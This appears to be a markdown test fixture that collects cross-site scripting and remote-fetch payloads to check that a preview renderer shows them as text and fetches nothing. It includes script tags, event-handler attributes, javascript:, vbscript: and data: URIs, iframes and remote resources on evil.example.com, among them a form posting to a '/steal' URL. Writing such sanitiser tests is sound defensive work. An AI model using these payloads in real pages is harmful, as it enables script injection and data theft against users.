# Hostile sample (test fixture, R-7)

Plainly fake. Every line below tries to run code or fetch something. Preview must show it
as text or drop it, and fetch nothing.

## Raw HTML

<script>window.__hostile = 'script tag ran'</script>

<SCRIPT SRC="https://evil.example.com/x.js"></SCRIPT>

<img src="x" onerror="window.__hostile = 'onerror ran'">

<body onload="window.__hostile = 'onload ran'">

<svg onload="window.__hostile = 'svg onload ran'"><script>window.__hostile = 'svg script ran'</script></svg>

<iframe src="https://evil.example.com/frame"></iframe>

<iframe srcdoc="<script>parent.__hostile = 'srcdoc ran'</script>"></iframe>

<a href="javascript:window.__hostile = 'href ran'">raw javascript link</a>

<style>body { background: url(https://evil.example.com/bg.png) } @import "https://evil.example.com/x.css";</style>

<link rel="stylesheet" href="https://evil.example.com/x.css">

<meta http-equiv="refresh" content="0; url=https://evil.example.com/">

<base href="https://evil.example.com/">

<object data="https://evil.example.com/x.swf"></object>

<embed src="https://evil.example.com/x.swf">

<video poster="https://evil.example.com/poster.png" src="https://evil.example.com/v.mp4"></video>

<form action="https://evil.example.com/steal"><input name="q"></form>

<div style="background-image: url('https://evil.example.com/div.png')">styled div</div>

<p>Inline <b onclick="window.__hostile = 'onclick ran'">bold</b> with a handler.</p>

<details open ontoggle="window.__hostile = 'ontoggle ran'"><summary>details</summary></details>

## Markdown links and images

[javascript link](javascript:window.__hostile='md link ran')

[spaced javascript link](  javascript:alert(1)  )

[encoded javascript link](&#106;avascript:alert(1))

[data link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

[vbscript link](vbscript:msgbox(1))

<javascript:alert(1)>

[remote link](https://evil.example.com/page "a title")

<https://evil.example.com/autolink>

![remote image](https://evil.example.com/pixel.png)

![protocol-relative image](//evil.example.com/pixel.png)

![data image](data:image/png;base64,iVBORw0KGgo=)

![reference image][pixel]

[reference link][page]

[pixel]: https://evil.example.com/ref.png
[page]: https://evil.example.com/ref-page

## Tables and code

| Left | Right <img src=x onerror=alert(1)> |
|:---|---:|
| `<script>alert(1)</script>` | [cell link](javascript:alert(1)) |

```"><script>window.__hostile = 'fence lang ran'</script>
<script>window.__hostile = 'code block ran'</script>
```

    <iframe src="https://evil.example.com/indented"></iframe>

Typographer bait: three hyphens --- and two -- stay hyphens.
